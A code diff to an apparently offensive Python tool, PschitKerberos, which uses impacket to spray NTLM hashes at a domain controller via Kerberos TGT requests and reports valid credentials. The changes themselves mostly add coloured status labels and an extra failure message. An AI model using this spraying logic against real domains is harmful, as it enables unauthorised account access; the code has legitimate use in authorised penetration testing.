@@ -6,10 +6,11 @@
 
 import argparse
 import pyfiglet 
+import socket
 from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError
 from impacket.krb5.types import Principal
 from impacket.krb5 import constants
-import socket
+from termcolor import colored
 from binascii import unhexlify
 
 class PschitKerberos:
@@ -51,6 +52,10 @@ class PschitKerberos:
 
 
 def main():
+    
+    info = colored("[*]", "blue")
+    success = colored("[+]", "green")
+    error = colored("[-]", "red")
 
     banner = pyfiglet.figlet_format("PschitKerberos") 
 
@@ -67,33 +72,34 @@ def main():
     print(banner)
     # IF file is given on argument
     if args.hashfile:
-        print(f"[+] Testing multiple hashes from file: {args.hashfile} against domain: {args.domain}")
+        print(f"{info} Testing multiple hashes from file: {args.hashfile} against domain: {args.domain}")
         with open(args.hashfile, 'r') as hash:
             for line in hash:
                 hash = line.strip()
                 kerberos_sprayer = PschitKerberos(user=args.username, domain=args.domain, hash=hash, password=None, aesKey=None, dc_ip=args.dc, verbose=args.verbose)
                 match kerberos_sprayer.spray():
                     case True:
-                        print(f'[+] {args.username}:{hash} is valid credential')
+                        print(f'{success} {args.username}:{hash} is valid credential')
                         break
                     case False:
-                        print(f'[-] {args.username} does not exist in the domain {args.domain}')
+                        print(f'{error} {args.username} does not exist in the domain {args.domain}')
                         break
                     case _:
                         if args.verbose:
-                            print(f'[-] {args.username}:{args.hash}', kerberos_sprayer.spray())
+                            print(f'{error} {args.username}:{args.hash}', kerberos_sprayer.spray())
     # IF just one is given on argument
     if args.hash:
-        print(f"[+] Testing a single hash against domain: {args.domain}")
+        print(f"{info} Testing a single hash against domain: {args.domain}")
         kerberos_sprayer = PschitKerberos(user=args.username, domain=args.domain, hash=args.hash, password=None, aesKey=None, dc_ip=args.dc, verbose=args.verbose)
         match kerberos_sprayer.spray():
             case True:
-                print(f'[+] {args.username}:{args.hash} is valid credential')
+                print(f'{success} {args.username}:{args.hash} is valid credential')
             case False:
-                print(f'[-] {args.username} does not exist in the domain {args.domain}')
+                print(f'{error} {args.username} does not exist in the domain {args.domain}')
             case _:
+                print(f'{error} {args.username}:{args.hash} is not a valid credential in the domain {args.domain}')
                 if args.verbose:
-                 print(f'[-] {args.username}:{args.hash}', kerberos_sprayer.spray())
+                 print(f'{error} {args.username}:{args.hash}', kerberos_sprayer.spray())
 
     if not args.hash and not args.hashfile:
         parser.error('-hash or -hashfile is required')
